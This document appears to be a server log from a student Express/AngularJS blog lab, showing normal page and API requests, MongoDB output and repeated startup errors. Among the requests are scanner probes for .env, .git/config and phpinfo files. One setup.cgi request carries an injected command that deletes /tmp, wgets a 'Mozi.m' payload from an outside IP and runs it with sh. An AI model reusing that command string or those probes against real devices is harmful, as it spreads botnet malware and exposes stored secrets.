+[0mGET /1_1_PhpInfo.php [32m200 [0m0.677 ms - 4978[0m
+[0mGET /5info.php [32m200 [0m0.708 ms - 4978[0m
+[0mGET / [32m200 [0m0.630 ms - 4978[0m
+[0mGET /api/index.php/v1/config/application?public=true [32m200 [0m0.900 ms - 4978[0m
+[0mGET /blogDelete/65f70de5793344b6ec9a4775 [36m304 [0m0.553 ms - -[0m
+[0mGET /lib/angular.min.js [36m304 [0m0.789 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.729 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.581 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.548 ms - -[0m
+[0mGET /css/all.min.css [36m304 [0m0.885 ms - -[0m
+[0mGET /js/bloggerApp.js [36m304 [0m1.119 ms - -[0m
+[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m1.221 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f70de5793344b6ec9a4775'),
+    title: 'Prof test',
+    text: 'Test',
+    createdOn: 2024-03-17T15:36:05.180Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m4.149 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.506 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.504 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.637 ms - -[0m
+[0mGET /.git/config [32m200 [0m0.673 ms - 4978[0m
+[0mGET / [32m200 [0m0.661 ms - 4978[0m
+[0mGET /.env [32m200 [0m0.740 ms - 4978[0m
+[0mPOST / [32m200 [0m0.939 ms - 4978[0m
+[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.200.185.167:50697/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [32m200 [0m1.001 ms - 4978[0m
+[0mGET /.env [32m200 [0m1.092 ms - 4978[0m
+[0mGET / [32m200 [0m1.139 ms - 4978[0m
+[0mGET /.git/config [32m200 [0m0.916 ms - 4978[0m
+[0mGET / [32m200 [0m0.763 ms - 4978[0m
+[0mGET /.env [32m200 [0m0.698 ms - 4978[0m
+[0mGET /.env [32m200 [0m0.710 ms - 4978[0m
+[0mPOST / [32m200 [0m0.668 ms - 4978[0m
+[0mGET /.git/config [32m200 [0m0.670 ms - 4978[0m
+[0mGET / [32m200 [0m0.596 ms - 4978[0m
+[0mGET / [32m200 [0m0.795 ms - 4978[0m
+[0mGET / [32m200 [0m0.617 ms - 4978[0m
+[0mGET /favicon.ico [32m200 [0m1.716 ms - 4978[0m
+[0mGET / [32m200 [0m0.755 ms - 4978[0m
+[0mGET / [32m200 [0m0.975 ms - 4978[0m
+[0mGET /.env [32m200 [0m0.713 ms - 4978[0m
+[0mPOST / [32m200 [0m0.826 ms - 4978[0m
+[0mGET / [32m200 [0m1.022 ms - 4978[0m
+[0mGET / [32m200 [0m0.593 ms - 4978[0m
+[0mGET / [33m404 [0m50.137 ms - 1154[0m
+Error: No default engine was specified and no extension was provided.
+    at new View (/home/bitnami/lab5/node_modules/express/lib/view.js:61:11)
+    at Function.render (/home/bitnami/lab5/node_modules/express/lib/application.js:587:12)
+    at ServerResponse.render (/home/bitnami/lab5/node_modules/express/lib/response.js:1039:7)
+    at /home/bitnami/lab5/app.js:51:7
+    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:71:5)
+    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:326:13)
+    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:346:12)
+    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:280:10)
+    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:67:12)
+[0mGET / [33m404 [0m1.134 ms - 1154[0m
+Error: No default engine was specified and no extension was provided.
+    at new View (/home/bitnami/lab5/node_modules/express/lib/view.js:61:11)
+    at Function.render (/home/bitnami/lab5/node_modules/express/lib/application.js:587:12)
+    at ServerResponse.render (/home/bitnami/lab5/node_modules/express/lib/response.js:1039:7)
+    at /home/bitnami/lab5/app.js:51:7
+    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:71:5)
+    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:326:13)
+    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:346:12)
+    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:280:10)
+    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:67:12)
+
+> blog@0.0.0 start
+> node ./bin/www
+
+node:events:495
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: listen EADDRINUSE: address already in use :::80
+    at Server.setupListenHandle [as _listen2] (node:net:1817:16)
+    at listenInCluster (node:net:1865:12)
+    at Server.listen (node:net:1953:7)
+    at Function.listen (/home/bitnami/lab6/node_modules/express/lib/application.js:635:24)
+    at Object.<anonymous> (/home/bitnami/lab6/app.js:55:5)
+    at Module._compile (node:internal/modules/cjs/loader:1356:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1414:10)
+    at Module.load (node:internal/modules/cjs/loader:1197:32)
+    at Module._load (node:internal/modules/cjs/loader:1013:12)
+    at Module.require (node:internal/modules/cjs/loader:1225:19)
+Emitted 'error' event on Server instance at:
+    at emitErrorNT (node:net:1844:8)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
+  code: 'EADDRINUSE',
+  errno: -98,
+  syscall: 'listen',
+  address: '::',
+  port: 80
+}
+
+Node.js v18.19.0
+[0mGET / [33m404 [0m0.986 ms - 1154[0m
+Error: No default engine was specified and no extension was provided.
+    at new View (/home/bitnami/lab5/node_modules/express/lib/view.js:61:11)
+    at Function.render (/home/bitnami/lab5/node_modules/express/lib/application.js:587:12)
+    at ServerResponse.render (/home/bitnami/lab5/node_modules/express/lib/response.js:1039:7)
+    at /home/bitnami/lab5/app.js:51:7
+    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:71:5)
+    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:326:13)
+    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:346:12)
+    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:280:10)
+    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:67:12)
+[0mGET / [33m404 [0m0.861 ms - 1154[0m
+Error: No default engine was specified and no extension was provided.
+    at new View (/home/bitnami/lab5/node_modules/express/lib/view.js:61:11)
+    at Function.render (/home/bitnami/lab5/node_modules/express/lib/application.js:587:12)
+    at ServerResponse.render (/home/bitnami/lab5/node_modules/express/lib/response.js:1039:7)
+    at /home/bitnami/lab5/app.js:51:7
+    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:71:5)
+    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:326:13)
+    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:346:12)
+    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:280:10)
+    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:67:12)
+[0mGET / [33m404 [0m1.058 ms - 1154[0m
+Error: No default engine was specified and no extension was provided.
+    at new View (/home/bitnami/lab5/node_modules/express/lib/view.js:61:11)
+    at Function.render (/home/bitnami/lab5/node_modules/express/lib/application.js:587:12)
+    at ServerResponse.render (/home/bitnami/lab5/node_modules/express/lib/response.js:1039:7)
+    at /home/bitnami/lab5/app.js:51:7
+    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:71:5)
+    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:326:13)
+    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:346:12)
+    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:280:10)
+    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:67:12)
+
+> blog@0.0.0 start
+> node ./bin/www
+
+node:events:495
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: listen EADDRINUSE: address already in use :::80
+    at Server.setupListenHandle [as _listen2] (node:net:1817:16)
+    at listenInCluster (node:net:1865:12)
+    at Server.listen (node:net:1953:7)
+    at Function.listen (/home/bitnami/lab5/node_modules/express/lib/application.js:635:24)
+    at Object.<anonymous> (/home/bitnami/lab5/app.js:55:5)
+    at Module._compile (node:internal/modules/cjs/loader:1356:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1414:10)
+    at Module.load (node:internal/modules/cjs/loader:1197:32)
+    at Module._load (node:internal/modules/cjs/loader:1013:12)
+    at Module.require (node:internal/modules/cjs/loader:1225:19)
+Emitted 'error' event on Server instance at:
+    at emitErrorNT (node:net:1844:8)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
+  code: 'EADDRINUSE',
+  errno: -98,
+  syscall: 'listen',
+  address: '::',
+  port: 80
+}
+
+Node.js v18.19.0
+[0mGET / [32m200 [0m8.132 ms - 4978[0m
+[0mGET /lib/angular.min.js [36m304 [0m1.538 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m6.705 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m5.656 ms - -[0m
+[0mGET /js/bloggerApp.js [36m304 [0m4.557 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m5.289 ms - -[0m
+[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m3.102 ms - -[0m
+[0mGET /css/all.min.css [36m304 [0m10.447 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.517 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.530 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f70de5793344b6ec9a4775'),
+    title: 'Prof test',
+    text: 'Test',
+    createdOn: 2024-03-17T15:36:05.180Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m73.064 ms - -[0m
+[0mGET / [32m200 [0m1.726 ms - 4978[0m
+[0mGET /stylesheets/style.css [32m200 [0m4.480 ms - 111[0m
+[0mGET /lib/angular-route.min.js [32m200 [0m5.244 ms - 5720[0m
+[0mGET /bootstrap/css/bootstrap.min.css [32m200 [0m4.776 ms - 4978[0m
+[0mGET /css/all.min.css [32m200 [0m6.479 ms - 4978[0m
+[0mGET /lib/angular.min.js [32m200 [0m2.885 ms - 177368[0m
+[0mGET /js/bloggerApp.js [32m200 [0m1.287 ms - 4939[0m
+[0mGET /css/bootstrap.min.css [32m200 [0m4.914 ms - 232948[0m
+[
+  {
+    _id: new ObjectId('65f70de5793344b6ec9a4775'),
+    title: 'Prof test',
+    text: 'Test',
+    createdOn: 2024-03-17T15:36:05.180Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m12.782 ms - 221[0m
+[0mGET /favicon.ico [32m200 [0m0.884 ms - 4978[0m
+[
+  {
+    _id: new ObjectId('65f70de5793344b6ec9a4775'),
+    title: 'Prof test',
+    text: 'Test',
+    createdOn: 2024-03-17T15:36:05.180Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m4.905 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f70de5793344b6ec9a4775'),
+    title: 'Prof test',
+    text: 'Test',
+    createdOn: 2024-03-17T15:36:05.180Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m5.183 ms - -[0m
+[0mGET / [32m200 [0m0.748 ms - 4978[0m
+[0mGET /lib/angular.min.js [36m304 [0m0.513 ms - -[0m
+[0mGET /js/bloggerApp.js [36m304 [0m0.774 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.647 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.502 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m1.040 ms - -[0m
+[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m1.087 ms - -[0m
+[0mGET /css/all.min.css [36m304 [0m1.222 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f70de5793344b6ec9a4775'),
+    title: 'Prof test',
+    text: 'Test',
+    createdOn: 2024-03-17T15:36:05.180Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.499 ms - -[0m
+[0mGET / [32m200 [0m0.741 ms - 4978[0m
+[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m2.238 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m1.730 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.764 ms - -[0m
+[0mGET /lib/angular.min.js [36m304 [0m1.349 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m2.026 ms - -[0m
+[0mGET /css/all.min.css [36m304 [0m2.576 ms - -[0m
+[0mGET /js/bloggerApp.js [36m304 [0m0.969 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f70de5793344b6ec9a4775'),
+    title: 'Prof test',
+    text: 'Test',
+    createdOn: 2024-03-17T15:36:05.180Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.481 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m1.450 ms - -[0m
+[0mGET / [32m200 [0m0.750 ms - 4978[0m
+[0mGET /lib/angular.min.js [36m304 [0m0.705 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m2.526 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m2.370 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m4.769 ms - -[0m
+[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m5.353 ms - -[0m
+[0mGET /css/all.min.css [36m304 [0m7.973 ms - -[0m
+[0mGET /js/bloggerApp.js [36m304 [0m0.431 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f70de5793344b6ec9a4775'),
+    title: 'Prof test',
+    text: 'Test',
+    createdOn: 2024-03-17T15:36:05.180Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.531 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m1.164 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f70de5793344b6ec9a4775'),
+    title: 'Prof test',
+    text: 'Test',
+    createdOn: 2024-03-17T15:36:05.180Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.917 ms - -[0m
+[0mGET / [32m200 [0m0.670 ms - 4978[0m
+[0mGET /lib/angular.min.js [36m304 [0m0.381 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.588 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.363 ms - -[0m
+[0mGET /js/bloggerApp.js [36m304 [0m0.349 ms - -[0m
+[0mGET /css/all.min.css [36m304 [0m1.363 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.248 ms - -[0m
+[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m0.815 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f70de5793344b6ec9a4775'),
+    title: 'Prof test',
+    text: 'Test',
+    createdOn: 2024-03-17T15:36:05.180Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m5.234 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.724 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f70de5793344b6ec9a4775'),
+    title: 'Prof test',
+    text: 'Test',
+    createdOn: 2024-03-17T15:36:05.180Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.366 ms - -[0m
+Finding blog details { blogid: '65f70de5793344b6ec9a4775' }
+{
+  _id: new ObjectId('65f70de5793344b6ec9a4775'),
+  title: 'Prof test',
+  text: 'Test',
+  createdOn: 2024-03-17T15:36:05.180Z,
+  __v: 0
+}
+[0mGET /api/blogs/65f70de5793344b6ec9a4775 [32m200 [0m9.256 ms - 115[0m
+[0mGET / [32m200 [0m0.632 ms - 4978[0m
+[0mGET /stylesheets/style.css [36m304 [0m1.265 ms - -[0m
+[0mGET /js/bloggerApp.js [36m304 [0m1.740 ms - -[0m
+[0mGET /lib/angular.min.js [36m304 [0m1.751 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m1.989 ms - -[0m
+[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m2.696 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m2.406 ms - -[0m
+[0mGET /css/all.min.css [36m304 [0m3.654 ms - -[0m
+Finding blog details { blogid: '65f70de5793344b6ec9a4775' }
+{
+  _id: new ObjectId('65f70de5793344b6ec9a4775'),
+  title: 'Prof test',
+  text: 'Test',
+  createdOn: 2024-03-17T15:36:05.180Z,
+  __v: 0
+}
+[0mGET /api/blogs/65f70de5793344b6ec9a4775 [32m200 [0m2.917 ms - 115[0m
+Finding blog details { blogid: '65f70de5793344b6ec9a4775' }
+{
+  _id: new ObjectId('65f70de5793344b6ec9a4775'),
+  title: 'Prof test',
+  text: 'Test',
+  createdOn: 2024-03-17T15:36:05.180Z,
+  __v: 0
+}
+[0mGET /api/blogs/65f70de5793344b6ec9a4775 [36m304 [0m3.519 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f70de5793344b6ec9a4775'),
+    title: 'Prof test',
+    text: 'Test',
+    createdOn: 2024-03-17T15:36:05.180Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.476 ms - -[0m
+Finding blog details { blogid: '65f71ab0793344b6ec9a4793' }
+{
+  _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+  title: 'Test',
+  text: 'Does it work?',
+  createdOn: 2024-03-17T16:30:40.544Z,
+  __v: 0
+}
+[0mGET /api/blogs/65f71ab0793344b6ec9a4793 [32m200 [0m3.835 ms - 119[0m
+[
+  {
+    _id: new ObjectId('65f70de5793344b6ec9a4775'),
+    title: 'Prof test',
+    text: 'Test',
+    createdOn: 2024-03-17T15:36:05.180Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m4.234 ms - -[0m
+[0mPOST /cgi-bin/system_mgr.cgi? [0m- [0m- ms - -[0m
+Error: No default engine was specified and no extension was provided.
+    at new View (/home/bitnami/lab5/node_modules/express/lib/view.js:61:11)
+    at Function.render (/home/bitnami/lab5/node_modules/express/lib/application.js:587:12)
+    at ServerResponse.render (/home/bitnami/lab5/node_modules/express/lib/response.js:1039:7)
+    at /home/bitnami/lab5/app.js:51:7
+    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:71:5)
+    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:326:13)
+    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:346:12)
+    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:280:10)
+    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:67:12)
+[0mGET /.env [32m200 [0m2.264 ms - 4978[0m
+[0mPOST / [32m200 [0m7.656 ms - 4978[0m
+[0mGET /.git/config [32m200 [0m0.829 ms - 4978[0m
+[0mGET / [32m200 [0m1.580 ms - 4978[0m
+
+> blog@0.0.0 start
+> node ./bin/www
+
+node:internal/modules/cjs/loader:1137
+  throw err;
+  ^
+
+Error: Cannot find module 'dotenv'
+Require stack:
+- /home/bitnami/lab6/app.js
+- /home/bitnami/lab6/bin/www
+    at Module._resolveFilename (node:internal/modules/cjs/loader:1134:15)
+    at Module._load (node:internal/modules/cjs/loader:975:27)
+    at Module.require (node:internal/modules/cjs/loader:1225:19)
+    at require (node:internal/modules/helpers:177:18)
+    at Object.<anonymous> (/home/bitnami/lab6/app.js:1:1)
+    at Module._compile (node:internal/modules/cjs/loader:1356:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1414:10)
+    at Module.load (node:internal/modules/cjs/loader:1197:32)
+    at Module._load (node:internal/modules/cjs/loader:1013:12)
+    at Module.require (node:internal/modules/cjs/loader:1225:19) {
+  code: 'MODULE_NOT_FOUND',
+  requireStack: [ '/home/bitnami/lab6/app.js', '/home/bitnami/lab6/bin/www' ]
+}
+
+Node.js v18.19.0
+
+> blog@0.0.0 start
+> node ./bin/www
+
+node:internal/modules/cjs/loader:1137
+  throw err;
+  ^
+
+Error: Cannot find module 'dotenv'
+Require stack:
+- /home/bitnami/lab6/app.js
+- /home/bitnami/lab6/bin/www
+    at Module._resolveFilename (node:internal/modules/cjs/loader:1134:15)
+    at Module._load (node:internal/modules/cjs/loader:975:27)
+    at Module.require (node:internal/modules/cjs/loader:1225:19)
+    at require (node:internal/modules/helpers:177:18)
+    at Object.<anonymous> (/home/bitnami/lab6/app.js:1:1)
+    at Module._compile (node:internal/modules/cjs/loader:1356:14)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1414:10)
+    at Module.load (node:internal/modules/cjs/loader:1197:32)
+    at Module._load (node:internal/modules/cjs/loader:1013:12)
+    at Module.require (node:internal/modules/cjs/loader:1225:19) {
+  code: 'MODULE_NOT_FOUND',
+  requireStack: [ '/home/bitnami/lab6/app.js', '/home/bitnami/lab6/bin/www' ]
+}
+
+Node.js v18.19.0
